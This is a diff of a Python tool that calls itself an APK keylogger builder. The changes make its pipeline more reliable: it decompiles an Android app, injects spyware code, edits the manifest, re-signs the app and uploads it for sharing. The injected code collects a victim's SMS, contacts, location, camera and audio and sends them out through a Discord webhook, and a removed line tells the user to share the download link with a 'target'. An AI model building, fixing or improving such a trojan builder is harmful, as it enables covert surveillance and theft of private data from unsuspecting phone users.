@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.1
-  Fixed: Colors.WHITE error + APK selection menu
+  TERMUX APK KEYLOGGER BUILDER v3.2
+  Fixed: Apktool build errors + better error handling
   Developer: GT Security Team
 ============================================================
 """
@@ -25,7 +25,7 @@ class Colors:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
-    WHITE = '\033[97m'          # <--- FIXED: Added WHITE
+    WHITE = '\033[97m'
     RESET = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
@@ -199,8 +199,15 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
 
     try:
         print_c("[*] Decoding APK...", Colors.YELLOW)
-        subprocess.run([shutil.which('apktool'), "d", input_apk, "-o", work_dir, "-f"], check=True, capture_output=True)
+        decode_cmd = [shutil.which('apktool'), "d", input_apk, "-o", work_dir, "-f"]
+        result = subprocess.run(decode_cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            print_c("[!] Decode failed:", Colors.RED)
+            print_c(result.stderr, Colors.RED)
+            shutil.rmtree(work_dir, ignore_errors=True)
+            raise Exception("APK decode failed. Try a different APK.")
 
+        # Get package name
         pkg_cmd = [shutil.which('aapt'), "dump", "badging", input_apk]
         result = subprocess.run(pkg_cmd, capture_output=True, text=True)
         pkg = "com.example.unknown"
@@ -209,6 +216,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
                 pkg = line.split("'")[1]
                 break
 
+        # Create smali
         smali_dir = os.path.join(work_dir, "smali", "com", "gt")
         os.makedirs(smali_dir, exist_ok=True)
 
@@ -216,6 +224,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(os.path.join(smali_dir, "CustomLogger.smali"), "w") as f:
             f.write(smali_code)
 
+        # Modify manifest
         manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
         with open(manifest_path, "r") as f:
             manifest = f.read()
@@ -238,22 +247,50 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(manifest_path, "w") as f:
             f.write(manifest)
 
+        # Rebuild with better flags
         print_c("[*] Rebuilding APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
-        subprocess.run([shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned], check=True, capture_output=True)
+        build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]
+        
+        # Try with --use-aapt2 if normal fails
+        result = subprocess.run(build_cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            print_c("[!] Build failed. Trying with --use-aapt2...", Colors.YELLOW)
+            build_cmd.append("--use-aapt2")
+            result = subprocess.run(build_cmd, capture_output=True, text=True)
+            if result.returncode != 0:
+                print_c("[!] Build error:", Colors.RED)
+                print_c(result.stderr, Colors.RED)
+                shutil.rmtree(work_dir, ignore_errors=True)
+                raise Exception("APK rebuild failed.")
 
+        # Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
-        subprocess.run([
+        sign_cmd = [
             shutil.which('jarsigner'), "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
             "-keystore", KEYSTORE, "-storepass", KEYSTORE_PASS,
             "-keypass", KEYSTORE_PASS, apk_unsigned, KEY_ALIAS
-        ], check=True, capture_output=True)
+        ]
+        result = subprocess.run(sign_cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            print_c("[!] Signing failed:", Colors.RED)
+            print_c(result.stderr, Colors.RED)
+            shutil.rmtree(work_dir, ignore_errors=True)
+            raise Exception("APK signing failed.")
 
+        # Align
         print_c("[*] Aligning APK...", Colors.YELLOW)
         apk_final = os.path.join(work_dir, "app-final.apk")
-        subprocess.run([shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final], check=True, capture_output=True)
+        align_cmd = [shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final]
+        result = subprocess.run(align_cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            print_c("[!] Alignment failed:", Colors.RED)
+            print_c(result.stderr, Colors.RED)
+            shutil.rmtree(work_dir, ignore_errors=True)
+            raise Exception("APK alignment failed.")
 
+        # Copy to output
         output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
         shutil.copy(apk_final, output_apk)
         shutil.rmtree(work_dir, ignore_errors=True)
@@ -270,7 +307,6 @@ def select_apk():
     download_dir = "/sdcard/Download"
     apks = []
     
-    # Check if Download folder exists
     if os.path.exists(download_dir):
         for f in os.listdir(download_dir):
             if f.endswith('.apk'):
@@ -293,9 +329,7 @@ def select_apk():
             elif 1 <= idx <= len(apks):
                 return apks[idx-1][0]
     
-    # If no APKs found or invalid choice
     print_c("\n📌 Tip: Place your APK in /sdcard/Download/", Colors.YELLOW)
-    print_c("   Or enter full path manually.", Colors.YELLOW)
     return input("📁 Enter APK path: ").strip()
 
 # ---------------------------- MENU FUNCTIONS ----------------------------
@@ -305,7 +339,7 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER BUILDER v3.1             ║
+    ║   APK KEYLOGGER BUILDER v3.2             ║
     ║   Local injection, cloud upload          ║
     ║   Discord webhook data exfiltration      ║
     ╚═══════════════════════════════════════════╝
@@ -325,7 +359,6 @@ def inject_flow():
     show_banner()
     print_c("\n--- INJECT APK ---", Colors.BLUE)
 
-    # APK path selection
     apk_path = select_apk()
     if not apk_path or not os.path.exists(apk_path):
         print_c("[!] File not found.", Colors.RED)
@@ -334,18 +367,15 @@ def inject_flow():
 
     print_c(f"[✓] Selected: {apk_path}", Colors.GREEN)
 
-    # Webhook
     webhook = input("🔗 Discord Webhook URL: ").strip()
     if "discord.com" not in webhook:
         print_c("[!] Invalid webhook URL.", Colors.RED)
         input("\n[Press Enter to go back]")
         return
 
-    # Interval
     interval = input("⏱️ Send interval (seconds, default 30): ").strip()
     interval = int(interval) if interval.isdigit() else 30
 
-    # Features
     print_c("\nSelect features to collect (y/n):", Colors.YELLOW)
     features = {}
     features['sms'] = input("  📨 SMS? ").lower() == 'y'
@@ -354,7 +384,6 @@ def inject_flow():
     features['camera'] = input("  📸 Camera? ").lower() == 'y'
     features['audio'] = input("  🎙️ Audio? ").lower() == 'y'
 
-    # Confirm
     print_c("\n[✓] Configuration:", Colors.GREEN)
     print(f"  APK: {apk_path}")
     print(f"  Webhook: {webhook[:30]}...")
@@ -364,7 +393,6 @@ def inject_flow():
     if confirm != 'y':
         return
 
-    # Output directory
     output_dir = os.path.join(os.getcwd(), "injected_apks")
     os.makedirs(output_dir, exist_ok=True)
 
@@ -381,7 +409,6 @@ def inject_flow():
         if link:
             print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
             print_c(f"   {link}", Colors.CYAN)
-            print_c("\nShare this link with your target. They can download and install the APK.", Colors.YELLOW)
         else:
             print_c("[!] Upload failed. APK saved locally:", Colors.RED)
             print_c(f"   {output_apk}", Colors.YELLOW)
@@ -397,31 +424,29 @@ def about():
     clear_screen()
     show_banner()
     print_c("\n--- ABOUT ---", Colors.BLUE)
-    print_c("This tool injects a custom keylogger into any APK.")
-    print_c("Features:")
+    print_c("APK Keylogger Injector v3.2")
+    print_c("Injects keylogger into any Android APK.")
+    print_c("\nFeatures:")
     print_c("  - SMS, Contacts, Location, Camera, Audio collection")
-    print_c("  - Discord webhook for data exfiltration")
+    print_c("  - Discord webhook exfiltration")
     print_c("  - Local processing – no server needed")
-    print_c("  - Upload to cloud for easy sharing")
+    print_c("  - Cloud upload for easy sharing")
     print_c("\nDeveloper: GT Security Team")
     print_c("For educational purposes only.")
     input("\n[Press Enter to go back]")
 
 # ---------------------------- MAIN ----------------------------
 if __name__ == "__main__":
-    # Check dependencies
     check_dependencies()
     generate_keystore()
 
-    # Ensure pip requests installed
     try:
         import requests
     except ImportError:
-        print_c("[!] 'requests' module not found. Installing...", Colors.YELLOW)
+        print_c("[!] 'requests' not found. Installing...", Colors.YELLOW)
         os.system("python -m pip install requests")
         import requests
 
-    # Main loop
     while True:
         choice = main_menu()
         if choice == '1':
@@ -432,5 +457,5 @@ if __name__ == "__main__":
             print_c("\n[+] Exiting. Goodbye!", Colors.GREEN)
             sys.exit(0)
         else:
-            print_c("[!] Invalid choice. Press Enter to continue.", Colors.RED)
+            print_c("[!] Invalid choice.", Colors.RED)
             input()
